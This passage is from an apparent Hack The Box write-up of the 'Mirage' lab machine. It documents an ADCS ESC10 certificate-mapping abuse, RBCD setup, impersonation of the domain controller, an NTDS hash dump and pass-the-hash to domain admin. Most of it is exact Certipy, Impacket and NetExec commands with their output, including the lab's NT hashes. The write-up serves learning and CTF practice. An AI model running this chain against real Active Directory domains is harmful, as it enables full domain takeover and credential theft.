+objectClass: WRITE</code></pre><p>It looks like i can modify the UPN of <code>mark.bbond</code> which could potentially be interesting</p><p>Bloodhound highlights ESC14, but scanning for vulnerable templates fails, indicating this probably isnt likely, but there may still be a path that involved ADCS</p><h2>ADCS (ESC10)</h2><p>After some research i find ESC10 involved having write access over a user UPN</p><p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\nathan.aadam\Documents&gt; $Path = &quot;HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL&quot;
+
+
+evil-winrm-py PS C:\Users\nathan.aadam\Documents&gt; Get-ItemProperty -Path $Path
+
+
+EventLogging              : 1
+CertificateMappingMethods : 4
+PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Secu
+                            rityProviders\SCHANNEL
+PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Secu
+                            rityProviders
+PSChildName               : SCHANNEL
+PSDrive                   : HKLM
+PSProvider                : Microsoft.PowerShell.Core\Registry
+
+
+
+evil-winrm-py PS C:\Users\nathan.aadam\Documents&gt;</code></pre><p>As seen here the value <code>CertificateMappingMethods</code> is set to 4, this means only UPN mapping is enabled</p><p>So this is a good sign as this is a requirement for ESC10</p><p><img src="images/mirage/pasted-image-20261012190112.webp" alt="Screenshot" loading="lazy" /></p><p>So looking at the wiki, all three conditions are met</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad account -u &#39;mirage-service$mirage.htb&#39; -k -no-pass -dc-ip &#39;10.129.232.163&#39; -user &#39;mark.bbond&#39; read -target dc01.mirage.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for &#39;mark.bbond&#39;:
+    cn                                  : mark.bbond
+    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
+    name                                : mark.bbond
+    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
+    sAMAccountName                      : mark.bbond
+    userPrincipalName                   : mark.bbond@mirage.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-05-02T08:36:23+00:00
+    whenChanged                         : 2026-10-12T23:01:57+00:**00**</code></pre><p>Ill first just show the currennt UPN value of the <code>mark.bbond</code> account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad account -u &#39;mirage-service$mirage.htb&#39; -k -no-pass -dc-ip &#39;10.129.232.163&#39; -upn &#39;dc01$@mirage.htb&#39; -user &#39;mark.bbond&#39; update -target dc01.mirage.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;mark.bbond&#39;:
+    userPrincipalName                   : dc01$@mirage.htb
+[*] Successfully updated &#39;mark.bbond&#39;</code></pre><p>Then ill modify the accounts UPN</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u &#39;mark.bbond&#39; -p &#39;1day@atime&#39; -k --generate-tgt mark
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime 
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: mark.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=mark.ccache
+
+❯❯❯ export KRB5CCNAME=mark.ccache</code></pre><p>I then need to request a TGT, its important this takes place after the UPN is mofified</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad req -k -no-pass -dc-ip &#39;10.129.232.163&#39; -target &#39;dc01.mirage.htb&#39; -ca &#39;mirage-DC01-CA&#39; -template &#39;User&#39;
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 11
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;dc01$@mirage.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-2127163471-3824721834-2568365109-1109&#39;
+[*] Saving certificate and private key to &#39;dc01.pfx&#39;
+[*] Wrote certificate and private key to &#39;dc01.pfx&#39;</code></pre><p>Ill then use a TGT of <code>mark.bbond</code> to request a certificate for the DC01$ machine account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad account -u &#39;mirage-service$@mirage.htb&#39; -k -no-pass -dc-ip &#39;10.129.232.163&#39; -upn &#39;mark.bbond@mirage.htb&#39; -user &#39;mark.bbond&#39; update -target dc01.mirage.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;mark.bbond&#39;:
+    userPrincipalName                   : mark.bbond@mirage.htb
+[*] Successfully updated &#39;mark.bbond&#39;</code></pre><p>Then ill reset the UPN back to the original using the TGT for <code>mirage-service$</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad auth -pfx &#39;dc01.pfx&#39; -dc-ip &#39;10.129.232.163&#39; -ldap-shell
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;dc01$@mirage.htb&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-2127163471-3824721834-2568365109-1109&#39;
+[*] Connecting to &#39;ldaps://10.129.232.163:636&#39;
+[*] Authenticated to &#39;10.129.232.163&#39; as: &#39;u:MIRAGE\\DC01$&#39;
+Type help for list of commands
+
+# whoami
+u:MIRAGE\DC01$
+
+# </code></pre><p>Then i can drop into an LDAP shell as the <code>dc01$</code> machine account</p><h2>Domain Admin</h2><p>Now i have an LDAP shell as the <code>dc01$</code> machine account, i can use the built in shell options to configure RBCD for the <code>mirage-service$</code> account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).</code></pre><p>This is the details taken from the help menu</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"># set_rbcd DC01$ mirage-service$
+Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
+Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
+
+Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
+Delegation rights modified successfully!
+mirage-service$ can now impersonate users on DC01$ via S4U2Proxy
+
+# </code></pre><p>Now RBCD should be setup</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h getST.py -spn &#39;cifs/DC01.mirage.htb&#39; -impersonate &quot;DC01$&quot; -dc-ip 10.129.232.163 &quot;mirage.htb&quot;/&quot;mirage-service$&quot; -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating DC01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache</code></pre><p>I can get a TGT for the <code>DC01$</code> machine account using the <code>mirage-service$</code> account, since this was the one i configured for RBCD</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ export KRB5CCNAME=DC01\$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
+
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb --use-kcache --ntds
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\DC01$ from ccache 
+SMB         dc01.mirage.htb 445    dc01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         dc01.mirage.htb 445    dc01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
+SMB         dc01.mirage.htb 445    dc01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc01.mirage.htb 445    dc01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+SMB         dc01.mirage.htb 445    dc01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
+SMB         dc01.mirage.htb 445    dc01             Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:5f62e853f3876d511ff8628cb59e757c:::
+SMB         dc01.mirage.htb 445    dc01             [+] Dumped 12 NTDS hashes to /home/kali/.nxc/logs/ntds/dc01_dc01.mirage.htb_2026-10-13_023340.ntds of which 10 were added to the database
+SMB         dc01.mirage.htb 445    dc01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc01.mirage.htb 445    dc01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc01_dc01.mirage.htb_2026-10-13_023340.ntds | cut -d &#39;:&#39; -f1</code></pre><p>I can then just dump the NTDS using the TGT of <code>DC01$</code></p><p>This can also be done with secretsdump</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u Administrator -H &#39;7be6d4f3c2b9c0e3560f5a29eeb1afb3&#39; -k --generate-tgt DA
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\Administrator:7be6d4f3c2b9c0e3560f5a29eeb1afb3 (Pwn3d!)
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: DA.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=DA.ccache
+
+❯❯❯ export KRB5CCNAME=DA.ccache</code></pre><p>Ill then just get a TGT for the DA using the NT hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h evil-winrm-py -i dc01.mirage.htb -k --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc01.mirage.htb:5985&#39; as &#39;Administrator@MIRAGE.HTB&#39;
+evil-winrm-py PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-ar---        10/12/2026   4:01 PM             34 root.txt                                                              
+
+
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Then i can log in as the domain admin</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-dump/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Dump</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-logging/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Logging</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
